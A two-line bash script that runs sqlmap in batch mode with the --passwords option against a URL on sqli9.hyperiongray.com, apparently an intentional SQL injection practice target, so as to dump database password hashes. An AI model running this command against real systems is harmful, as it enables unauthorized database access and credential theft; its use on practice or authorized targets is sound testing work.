#!/bin/bash

python sqlmap.py --flush-session --batch --passwords -u "http://sqli9.hyperiongray.com/?user=root"
